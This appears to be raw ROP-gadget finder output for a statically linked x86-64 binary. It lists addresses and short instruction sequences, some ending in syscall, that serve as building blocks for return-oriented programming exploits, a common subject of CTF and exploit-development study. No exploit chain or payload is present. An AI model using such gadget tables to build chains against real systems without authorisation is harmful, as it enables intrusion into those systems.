0x0000000000414a73 : add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret 0x149
0x0000000000498c5d : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x000000000047a6cd : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x40], cl ; vzeroupper ; ret
0x00000000004983bd : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x000000000042a91d : add byte ptr [rax], al ; add byte ptr [rcx + rcx*8 - 0x7cb7dd8c], al ; ret 0x4801
0x0000000000451db8 : add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x451dc7 ; call r12
0x0000000000451de8 : add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x451df7 ; call r12
0x0000000000465f61 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret
0x000000000040b15e : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x149
0x00000000004808e2 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x848b
0x00000000004238f5 : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000042cb5d : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x000000000042b46d : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x0000000000432520 : add byte ptr [rax], al ; add byte ptr [rcx - 9], cl ; ret 1
0x0000000000432546 : add byte ptr [rax], al ; add byte ptr [rcx - 9], cl ; ret 2
0x000000000048a7c4 : add byte ptr [rax], al ; add byte ptr [rcx], dh ; imul al ; ret 0xf75c
0x0000000000415602 : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x0000000000431e2a : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rol bl, 0x83 ; ret 0x6620
0x0000000000493ae3 : add byte ptr [rax], al ; add byte ptr [rdi + 1], bh ; call r14
0x0000000000493b0b : add byte ptr [rax], al ; add byte ptr [rdi + 1], bh ; call rax
0x000000000049485a : add byte ptr [rax], al ; add byte ptr [rdi + 2], dh ; sbb eax, eax ; ret
0x0000000000469fa3 : add byte ptr [rax], al ; add byte ptr [rdi + rcx - 0x4a], al ; or al, 0x89 ; ret 0xc689
0x0000000000414514 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0x8944c689 ; ret 0xeab8
0x0000000000487c14 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; add eax, 0x940fc085 ; ret 0x3d
0x000000000044eb55 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x000000000043c2fd : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x000000000043c36d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x000000000044ec0d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0xc1 ; pop rbx ; ret
0x00000000004196dd : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x0000000000431e6d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esp, 0xf80148c0 ; ret
0x000000000045f4f9 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0xc083
0x00000000004019ce : add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, ebp ; ret 0x2948
0x000000000047d440 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xc283
0x0000000000493ce5 : add byte ptr [rax], al ; add byte ptr [rdx + 0x48], dh ; add esp, 0x18 ; ret
0x0000000000433002 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000042085d : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret 0x8348
0x0000000000431d92 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x000000000041a8a5 : add byte ptr [rax], al ; add cl, ch ; ret
0x0000000000465988 : add byte ptr [rax], al ; add cl, ch ; ret 0xfffa
0x000000000045b826 : add byte ptr [rax], al ; add cl, ch ; ret 0xfffd
0x0000000000400c60 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000470c46 : add byte ptr [rax], al ; add dh, al ; test eax, ebp ; idiv bh ; jmp qword ptr [rax]
0x0000000000465490 : add byte ptr [rax], al ; add dh, al ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x0000000000457c7c : add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x000000000042918d : add byte ptr [rax], al ; add dh, dh ; ret 0x4804
0x000000000045101d : add byte ptr [rax], al ; add dh, dh ; ret 0x7404
0x000000000044caa1 : add byte ptr [rax], al ; add dh, dh ; ret 0x7501
0x000000000047b48e : add byte ptr [rax], al ; add rax, 3 ; ret
0x0000000000431c43 : add byte ptr [rax], al ; add rax, rdi ; add rax, rcx ; ret
0x0000000000418362 : add byte ptr [rax], al ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000493d20 : add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x000000000048b44c : add byte ptr [rax], al ; add rsp, 0x30 ; pop rbx ; ret
0x00000000004917e3 : add byte ptr [rax], al ; add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x000000000041cbdb : add byte ptr [rax], al ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x0000000000450179 : add byte ptr [rax], al ; add rsp, 0x68 ; ret
0x000000000045050c : add byte ptr [rax], al ; add rsp, 0x78 ; ret
0x0000000000407e7c : add byte ptr [rax], al ; add rsp, 0x98 ; ret
0x0000000000451cae : add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000400415 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x00000000004bcf7a : add byte ptr [rax], al ; and byte ptr [rbp + 0x78d00000], 0xfd ; call qword ptr [rbx]
0x00000000004b6d1a : add byte ptr [rax], al ; and byte ptr [rbx], al ; add byte ptr [rax], dh ; stosd dword ptr [rdi], eax ; clc ; call qword ptr [rax]
0x000000000044ec56 : add byte ptr [rax], al ; and ch, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x0000000000431e6e : add byte ptr [rax], al ; bsf eax, eax ; add rax, rdi ; ret
0x0000000000447490 : add byte ptr [rax], al ; bsf rax, rdx ; ret
0x0000000000479e94 : add byte ptr [rax], al ; bsr rax, rax ; add rax, rdi ; ret
0x00000000004b8f36 : add byte ptr [rax], al ; call 0x124b89ca
0x00000000004b52e6 : add byte ptr [rax], al ; call 0x174b4997
0x00000000004b90e2 : add byte ptr [rax], al ; call 0x284b9158
0x0000000000424247 : add byte ptr [rax], al ; call 0x400505
0x0000000000416581 : add byte ptr [rax], al ; call 0x452834
0x00000000004165f5 : add byte ptr [rax], al ; call 0x452864
0x00000000004ba556 : add byte ptr [rax], al ; call 0xffffffffe34ba15a
0x000000000040799c : add byte ptr [rax], al ; call qword ptr [rbx + 0x10]
0x00000000004153ee : add byte ptr [rax], al ; call qword ptr [rbx]
0x0000000000493ae9 : add byte ptr [rax], al ; call r14
0x00000000004152fb : add byte ptr [rax], al ; call rax
0x000000000048c48e : add byte ptr [rax], al ; call rbx
0x00000000004a91de : add byte ptr [rax], al ; call rdi
0x0000000000415235 : add byte ptr [rax], al ; call rdx
0x00000000004a838e : add byte ptr [rax], al ; call rsp
0x000000000044ecd4 : add byte ptr [rax], al ; clc ; jg 0x44ecd8 ; int1 ; mov eax, eax ; ret
0x00000000004b33c6 : add byte ptr [rax], al ; clc ; test ebp, esi ; call qword ptr [rdx]
0x000000000044ec01 : add byte ptr [rax], al ; cmove rax, rcx ; pop rbx ; ret
0x000000000044ebc9 : add byte ptr [rax], al ; cmove rax, rdx ; pop rbx ; ret
0x000000000042aeac : add byte ptr [rax], al ; cmove rax, rdx ; ret
0x000000000042a2a3 : add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x00000000004b7036 : add byte ptr [rax], al ; cmp al, 0x46 ; add byte ptr [rax], al ; hlt ; insb byte ptr [rdi], dx ; stc ; call rsp
0x00000000004b9236 : add byte ptr [rax], al ; cmp al, 0x68 ; add byte ptr [rax], al ; xor al, 0xa4 ; cli ; call qword ptr [rdx]
0x00000000004ba59e : add byte ptr [rax], al ; cmp bh, 0xfb ; jmp qword ptr [rax]
0x00000000004b8f32 : add byte ptr [rax], al ; cmp byte ptr [rbp], ah ; add al, ch ; mov dl, bh ; call qword ptr [rcx]
0x00000000004b6e86 : add byte ptr [rax], al ; cmp byte ptr [rdx], bh ; stc ; jmp qword ptr [rbx]
0x000000000048650c : add byte ptr [rax], al ; cmp rax, -1 ; cmove rax, rdx ; ret
0x0000000000426117 : add byte ptr [rax], al ; cmp rdx, r8 ; jne 0x4260e8 ; ret
0x00000000004b7556 : add byte ptr [rax], al ; cwde ; mov bh, cl ; jmp qword ptr [rcx]
0x00000000004b4166 : add byte ptr [rax], al ; cwde ; ret
0x00000000004b786e : add byte ptr [rax], al ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004b33c2 : add byte ptr [rax], al ; enter 9, 0 ; clc ; test ebp, esi ; call qword ptr [rdx]
0x00000000004b33d6 : add byte ptr [rax], al ; fmul qword ptr [rcx] ; add byte ptr [rax], al ; add al, 0x86 ; cmc ; call rsp
0x00000000004b2c46 : add byte ptr [rax], al ; fsubr st(1) ; hlt ; jmp rdi
0x00000000004b703a : add byte ptr [rax], al ; hlt ; insb byte ptr [rdi], dx ; stc ; call rsp
0x0000000000400a98 : add byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x00000000004bc6ba : add byte ptr [rax], al ; in al, 0x28 ; std ; jmp qword ptr [rdx]
0x00000000004b7102 : add byte ptr [rax], al ; in al, dx ; jne 0x4b7105 ; jmp rbx
0x000000000049485b : add byte ptr [rax], al ; ja 0x494868 ; sbb eax, eax ; ret
0x0000000000419376 : add byte ptr [rax], al ; je 0x419381 ; ret
0x000000000042af10 : add byte ptr [rax], al ; je 0x42aedf ; ret
0x000000000047a8a9 : add byte ptr [rax], al ; je 0x47a8b5 ; ret
0x0000000000493ce6 : add byte ptr [rax], al ; je 0x493cd4 ; add rsp, 0x18 ; ret
0x0000000000493d76 : add byte ptr [rax], al ; je 0x493d5a ; ret
0x0000000000493db7 : add byte ptr [rax], al ; je 0x493dc8 ; mov qword ptr [rdi + rsi*8], rdx ; ret
0x00000000004b84ca : add byte ptr [rax], al ; je 0x4b84ca ; stc ; jmp qword ptr [rdx]
0x00000000004ba73a : add byte ptr [rax], al ; jge 0x4ba748 ; add byte ptr [rax + 8], ah ; cld ; jmp qword ptr [rax]
0x00000000004b7ea2 : add byte ptr [rax], al ; jl 0x4b7e6c ; stc ; jmp qword ptr [rdx]
0x000000000041552a : add byte ptr [rax], al ; jmp 0x4154e9
0x0000000000415cc7 : add byte ptr [rax], al ; jmp 0x415c90
0x000000000044fe91 : add byte ptr [rax], al ; jmp 0x44fd23
0x00000000004560c1 : add byte ptr [rax], al ; jmp 0x455dc6
0x0000000000463c5f : add byte ptr [rax], al ; jmp 0x463c28
0x000000000048c758 : add byte ptr [rax], al ; jmp 0x48c722
0x000000000045115b : add byte ptr [rax], al ; jmp rax
0x0000000000420a3e : add byte ptr [rax], al ; jne 0x420a51 ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000432b02 : add byte ptr [rax], al ; jne 0x432a18 ; ret
0x000000000044f29d : add byte ptr [rax], al ; jne 0x44f2cd ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000450055 : add byte ptr [rax], al ; jne 0x450071 ; add rsp, 0x28 ; ret
0x0000000000450285 : add byte ptr [rax], al ; jne 0x4502d3 ; add rsp, 0x58 ; ret
0x0000000000450615 : add byte ptr [rax], al ; jne 0x45066b ; add rsp, 0x68 ; ret
0x0000000000450f84 : add byte ptr [rax], al ; jne 0x450f9f ; add rsp, 0x28 ; ret
0x00000000004618cd : add byte ptr [rax], al ; jne 0x4618de ; add rsp, 0x18 ; ret
0x000000000047c3da : add byte ptr [rax], al ; jne 0x47c42b ; add rsp, 0x58 ; ret
0x000000000047c50c : add byte ptr [rax], al ; jne 0x47c533 ; add rsp, 0x38 ; ret
0x0000000000488858 : add byte ptr [rax], al ; jne 0x48886b ; add rsp, 0x20 ; pop rbx ; ret
0x0000000000488953 : add byte ptr [rax], al ; jne 0x48898b ; add rsp, 0x38 ; ret
0x0000000000488a13 : add byte ptr [rax], al ; jne 0x488a46 ; add rsp, 0x68 ; ret
0x0000000000488b74 : add byte ptr [rax], al ; jne 0x488bb6 ; add rsp, 0x78 ; ret
0x0000000000488e43 : add byte ptr [rax], al ; jne 0x488e76 ; add rsp, 0x68 ; ret
0x000000000048ae7f : add byte ptr [rax], al ; jne 0x48aec3 ; leave ; ret
0x000000000048bb2b : add byte ptr [rax], al ; jne 0x48bb3c ; add rsp, 0x38 ; ret
0x000000000048bc0e : add byte ptr [rax], al ; jne 0x48bc2c ; add rsp, 0x38 ; ret
0x000000000048e3d9 : add byte ptr [rax], al ; jne 0x48e3e4 ; pop rbx ; ret
0x000000000048ef69 : add byte ptr [rax], al ; jne 0x48ef84 ; add rsp, 0x38 ; ret
0x0000000000494c82 : add byte ptr [rax], al ; jne 0x494ca5 ; ret
0x00000000004b6d6a : add byte ptr [rax], al ; jo 0x4b6dba ; add byte ptr [rax], al ; loopne 0x4b6d62 ; clc ; call qword ptr [rax]
0x00000000004b786a : add byte ptr [rax], al ; jo 0x4b78c5 ; add byte ptr [rax], al ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004ba3be : add byte ptr [rax], al ; jo 0x4ba3b7 ; sti ; jmp qword ptr [rbx]
0x00000000004bc06a : add byte ptr [rax], al ; jo 0x4bc00d ; add byte ptr [rax], al ; push rax ; stc ; cld ; jmp qword ptr [rdx]
0x000000000044b86e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xa] ; ret
0x000000000044b87e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xb] ; ret
0x000000000044b88e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xc] ; ret
0x000000000044b89e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xd] ; ret
0x000000000044b8ae : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xe] ; ret
0x000000000044b7cd : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 0xf] ; ret
0x000000000044b7ee : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 1] ; ret
0x000000000044b7fe : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 2] ; ret
0x000000000044b80e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 3] ; ret
0x000000000044b81e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 4] ; ret
0x000000000044b82e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 5] ; ret
0x000000000044b83e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 6] ; ret
0x000000000044b77a : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 7] ; ret
0x000000000044b84e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 8] ; ret
0x000000000044b85e : add byte ptr [rax], al ; lea rax, qword ptr [rdi + 9] ; ret
0x000000000044b7de : add byte ptr [rax], al ; lea rax, qword ptr [rdi] ; ret
0x0000000000453fae : add byte ptr [rax], al ; lea rax, qword ptr [rip + 0x26e349] ; ret
0x00000000004723da : add byte ptr [rax], al ; lea rsi, qword ptr [rip + 0x24ca3d] ; jmp rax
0x0000000000400c61 : add byte ptr [rax], al ; leave ; ret
0x00000000004b6d6e : add byte ptr [rax], al ; loopne 0x4b6d5e ; clc ; call qword ptr [rax]
0x00000000004b7c9e : add byte ptr [rax], al ; loopne 0x4b7c54 ; stc ; call qword ptr [rax]
0x000000000044a74e : add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, qword ptr [rdx] ; ret
0x0000000000448f9e : add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x00000000004b6e82 : add byte ptr [rax], al ; mov byte ptr [rax + rax], al ; cmp byte ptr [rdx], bh ; stc ; jmp qword ptr [rbx]
0x000000000041941e : add byte ptr [rax], al ; mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x000000000044b23e : add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, qword ptr [rdi] ; ret
0x000000000044ac1e : add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x00000000004ba5b6 : add byte ptr [rax], al ; mov byte ptr [rdx], al ; cld ; jmp qword ptr [rbx]
0x00000000004bc082 : add byte ptr [rax], al ; mov byte ptr [rsi - 0x6980000], dl ; cld ; jmp rdx
0x00000000004b7882 : add byte ptr [rax], al ; mov byte ptr [rsi], cl ; add byte ptr [rax - 0x68], bl ; stc ; jmp qword ptr [rcx]
0x00000000004785fb : add byte ptr [rax], al ; mov dword ptr [rbx + 0x74], edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041fcdc : add byte ptr [rax], al ; mov dword ptr [rip + 0x2a1b28], eax ; ret
0x000000000044ac2e : add byte ptr [rax], al ; mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x000000000042a1fe : add byte ptr [rax], al ; mov eax, 0x16 ; ret
0x000000000047c17e : add byte ptr [rax], al ; mov eax, 0x66 ; syscall ; ret
0x000000000047c19e : add byte ptr [rax], al ; mov eax, 0x68 ; syscall ; ret
0x000000000047c18e : add byte ptr [rax], al ; mov eax, 0x6b ; syscall ; ret
0x000000000047c1ae : add byte ptr [rax], al ; mov eax, 0x6c ; syscall ; ret
0x00000000004b7bb2 : add byte ptr [rax], al ; mov eax, 0x8000051 ; lodsb al, byte ptr [rsi] ; stc ; jmp qword ptr [rcx]
0x00000000004ba5b2 : add byte ptr [rax], al ; mov eax, 0x8800007b ; add bh, ah ; jmp qword ptr [rbx]
0x00000000004b7cb2 : add byte ptr [rax], al ; mov eax, 0xd8000052 ; lodsd eax, dword ptr [rsi] ; stc ; call qword ptr [rdx]
0x0000000000418739 : add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x00000000004011e6 : add byte ptr [rax], al ; mov eax, 1 ; ret
0x000000000048b2c4 : add byte ptr [rax], al ; mov eax, 2 ; ret
0x000000000041edfe : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x00000000004960fe : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x496119 ; ret
0x000000000049632e : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x496349 ; ret
0x000000000048526f : add byte ptr [rax], al ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x000000000046f422 : add byte ptr [rax], al ; mov eax, edx ; pop rbx ; ret
0x000000000046cbc1 : add byte ptr [rax], al ; mov eax, edx ; ret
0x00000000004171f2 : add byte ptr [rax], al ; mov eax, esi ; pop rbx ; ret
0x000000000044ac5e : add byte ptr [rax], al ; mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x0000000000493ae4 : add byte ptr [rax], al ; mov edi, 1 ; call r14
0x0000000000493b0c : add byte ptr [rax], al ; mov edi, 1 ; call rax
0x000000000043bafe : add byte ptr [rax], al ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x000000000043c21e : add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x00000000004bc6b6 : add byte ptr [rax], al ; mov esp, 0xe400009c ; sub ch, bh ; jmp qword ptr [rdx]
0x0000000000452c1e : add byte ptr [rax], al ; mov qword ptr [rax + 0x20], rsi ; ret
0x000000000048baa8 : add byte ptr [rax], al ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x00000000004887d0 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x000000000048efe2 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rbx ; ret
0x000000000048f0b6 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x20], rax ; pop rbx ; ret
0x0000000000482234 : add byte ptr [rax], al ; mov qword ptr [rdi + 0x308], rax ; ret
0x0000000000493e0e : add byte ptr [rax], al ; mov qword ptr [rdi + 0x98], rsi ; ret
0x000000000048b0d8 : add byte ptr [rax], al ; mov qword ptr [rdi], rsi ; ret
0x000000000041fc9c : add byte ptr [rax], al ; mov qword ptr [rip + 0x2a1b43], rax ; ret
0x000000000041fc7c : add byte ptr [rax], al ; mov qword ptr [rip + 0x2a1b5b], rax ; ret
0x000000000041e38e : add byte ptr [rax], al ; mov rax, -1 ; ret
0x000000000047b4ae : add byte ptr [rax], al ; mov rax, 1 ; ret
0x000000000047b4be : add byte ptr [rax], al ; mov rax, 2 ; ret
0x000000000047b4ce : add byte ptr [rax], al ; mov rax, 3 ; ret
0x000000000047b4de : add byte ptr [rax], al ; mov rax, 4 ; ret
0x000000000047b4ee : add byte ptr [rax], al ; mov rax, 5 ; ret
0x000000000047b4fe : add byte ptr [rax], al ; mov rax, 6 ; ret
0x000000000047b50e : add byte ptr [rax], al ; mov rax, 7 ; ret
0x0000000000483803 : add byte ptr [rax], al ; mov rax, qword ptr [r15 + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000041828e : add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x000000000048868e : add byte ptr [rax], al ; mov rax, qword ptr [rax + 8] ; ret
0x000000000048301e : add byte ptr [rax], al ; mov rax, qword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x0000000000478afe : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x000000000041f14e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x0000000000493d8e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x90] ; ret
0x0000000000493e1e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xa0] ; ret
0x0000000000493e7e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xa8] ; ret
0x0000000000493e6e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xb0] ; ret
0x0000000000493e2e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xb8] ; ret
0x000000000045e62e : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x265881] ; ret
0x00000000004560de : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x26ebd1] ; ret
0x000000000041f12e : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x2a1fe9] ; ret
0x0000000000491b5e : add byte ptr [rax], al ; mov rax, qword ptr [rsi + 0xa8] ; ret
0x000000000047a6ce : add byte ptr [rax], al ; mov rax, r8 ; vzeroupper ; ret
0x000000000041a804 : add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000493f88 : add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x000000000041b182 : add byte ptr [rax], al ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041f15e : add byte ptr [rax], al ; mov rax, rdi ; ret
0x000000000042472e : add byte ptr [rax], al ; mov rax, rsi ; ret
0x000000000044da1f : add byte ptr [rax], al ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000451db9 : add byte ptr [rax], al ; mov rdi, qword ptr [r13] ; call r12
0x0000000000415321 : add byte ptr [rax], al ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x0000000000498c5e : add byte ptr [rax], al ; mov rdi, r13 ; call rax
0x00000000004983be : add byte ptr [rax], al ; mov rdi, r15 ; call rax
0x0000000000475b5f : add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x000000000043c05e : add byte ptr [rax], al ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x000000000045d017 : add byte ptr [rax], al ; mov rdx, rax ; jmp 0x45cfd4
0x0000000000426d76 : add byte ptr [rax], al ; mov rsi, qword ptr [rsp + 0x68] ; call rax
0x00000000004947fe : add byte ptr [rax], al ; mov rsi, r14 ; mov rdi, r12 ; call r15
0x0000000000429fde : add byte ptr [rax], al ; mov rsi, rbp ; mov rdi, rax ; call rcx
0x00000000004bc786 : add byte ptr [rax], al ; mov word ptr [rbp + 0x2a640000], ds ; std ; jmp rsp
0x00000000004b7e9e : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; push rsp ; add byte ptr [rax], al ; jl 0x4b7e70 ; stc ; jmp qword ptr [rdx]
0x0000000000487b2e : add byte ptr [rax], al ; movsx eax, dl ; sub eax, ecx ; ret
0x0000000000491c15 : add byte ptr [rax], al ; movsxd rax, dword ptr [r15 + rax*4] ; add rax, r15 ; jmp rax
0x0000000000475d14 : add byte ptr [rax], al ; movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x0000000000460fbd : add byte ptr [rax], al ; movsxd rdi, dword ptr [r11 + rsi*4] ; add rdi, r11 ; jmp rdi
0x0000000000460abe : add byte ptr [rax], al ; movsxd rsi, dword ptr [r8 + r9*4] ; add rsi, r8 ; jmp rsi
0x00000000004196de : add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x000000000044ec0e : add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x000000000043bc8e : add byte ptr [rax], al ; movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x000000000043c36e : add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x000000000043c2fe : add byte ptr [rax], al ; movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00000000004b718a : add byte ptr [rax], al ; nop ; add byte ptr [r8], r8b ; xor byte ptr [rax - 7], bh ; call qword ptr [rbx]
0x0000000000452b39 : add byte ptr [rax], al ; nop dword ptr [rax + rax] ; ret
0x00000000004b6d06 : add byte ptr [rax], al ; or al, 0x43 ; add byte ptr [rax], al ; adc al, 0x89 ; clc ; jmp qword ptr [rsi]
0x00000000004b357a : add byte ptr [rax], al ; or byte ptr [rbx], 0 ; add byte ptr [rax - 0x6c], al ; cmc ; jmp qword ptr [rax]
0x00000000004bd302 : add byte ptr [rax], al ; or byte ptr [rcx - 0x72480000], ch ; std ; call qword ptr [rdx]
0x00000000004b8102 : add byte ptr [rax], al ; or byte ptr [rdi], dl ; add byte ptr [rdi - 0x7c], cl ; hlt ; jmp qword ptr [rbx]
0x00000000004b2c4f : add byte ptr [rax], al ; or dword ptr [r11], eax ; or byte ptr [rbx], al ; fild word ptr [rcx] ; ret
0x00000000004b7552 : add byte ptr [rax], al ; pop rax ; add byte ptr [r8], al ; cwde ; mov bh, cl ; jmp qword ptr [rcx]
0x00000000004b7886 : add byte ptr [rax], al ; pop rax ; cwde ; stc ; jmp qword ptr [rcx]
0x00000000004ba552 : add byte ptr [rax], al ; pop rax ; jnp 0x4ba560 ; add al, ch ; clc ; sti ; jmp rdx
0x00000000004bc752 : add byte ptr [rax], al ; pop rax ; popfq ; add byte ptr [rax], al ; sub byte ptr [rdx], ch ; std ; jmp qword ptr [rcx]
0x00000000004b8446 : add byte ptr [rax], al ; pop rax ; stc ; call qword ptr [rax]
0x000000000045116e : add byte ptr [rax], al ; pop rbp ; pop r12 ; jmp rax
0x00000000004010d4 : add byte ptr [rax], al ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000400ad6 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000046cb6b : add byte ptr [rax], al ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x000000000045e78a : add byte ptr [rax], al ; pop rbx ; pop r12 ; ret
0x000000000041acb3 : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000040135c : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041661a : add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000407706 : add byte ptr [rax], al ; pop rbx ; ret
0x00000000004b8442 : add byte ptr [rax], al ; pop rdx ; add byte ptr [rax], al ; pop rax ; stc ; call qword ptr [rax]
0x00000000004b7902 : add byte ptr [rax], al ; pop rsp ; cdq ; stc ; call rsi
0x00000000004b4162 : add byte ptr [rax], al ; push -0x67ffffe9 ; ret
0x00000000004b6a4a : add byte ptr [rax], al ; push rax ; add byte ptr [rax], al ; xor byte ptr [rax - 9], cl ; jmp qword ptr [rbx]
0x00000000004bc06e : add byte ptr [rax], al ; push rax ; stc ; cld ; jmp qword ptr [rdx]
0x00000000004bb42e : add byte ptr [rax], al ; push rcx ; hlt ; jmp qword ptr [rcx]
0x00000000004bbd3e : add byte ptr [rax], al ; rcr ch, 1 ; cld ; jmp qword ptr [rcx]
0x00000000004004fe : add byte ptr [rax], al ; ret
0x000000000049f566 : add byte ptr [rax], al ; ret 0
0x00000000004a64de : add byte ptr [rax], al ; ret 0x10
0x00000000004a81ae : add byte ptr [rax], al ; ret 0x1d4
0x00000000004a8946 : add byte ptr [rax], al ; ret 0x1d5
0x00000000004a71b6 : add byte ptr [rax], al ; ret 0x24
